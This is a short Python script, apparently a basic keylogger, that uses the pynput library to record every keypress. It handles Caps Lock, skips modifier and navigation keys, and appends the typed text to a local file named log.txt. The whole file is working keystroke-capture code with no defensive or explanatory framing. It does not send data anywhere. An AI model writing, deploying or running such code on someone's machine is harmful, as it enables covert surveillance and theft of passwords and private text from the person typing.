from pynput.keyboard import Listener, Key

# Set of keys to ignore
ignore_keys = {
    'Key.shift_r', 'Key.shift_l', 'Key.ctrl_l', 'Key.ctrl_r',
    'Key.ctrl', 'Key.alt', 'Key.alt_gr', 'Key.alt_l', 'Key.alt_r',
    'Key.cmd', 'Key.cmd_l', 'Key.cmd_r', 'Key.delete', 'Key.down',
    'Key.end', 'Key.esc', 'Key.f1', 'Key.home', 'Key.menu',
    'Key.num_lock', 'Key.page_down', 'Key.page_up', 'Key.pause',
    'Key.print_screen', 'Key.right', 'Key.shift', 'Key.scroll_lock',
    'Key.tab', 'Key.up'
}

caps_lock_on = False

def on_press(key):
    global caps_lock_on
    letter = str(key).replace("'", "")

    # Track Caps Lock state
    if letter == 'Key.caps_lock':
        caps_lock_on = not caps_lock_on
        return  # No need to log the Caps Lock key itself

    if letter in ignore_keys:
        letter = ''  # Ignore these keys
    elif letter == 'Key.space':
        letter = ' '  # Handle space key separately
    elif letter == 'Key.enter':
        letter = '\n'  # Handle enter key separately
    elif letter == 'Key.backspace':
        letter = ''  # Represent backspace as empty string
    elif len(letter) == 1:  # Only adjust the case for single character keys
        if caps_lock_on:
            letter = letter.upper() if letter.islower() else letter.lower()

    with open("log.txt", 'a') as f:
        f.write(letter)

with Listener(on_press=on_press) as l:
    l.join()
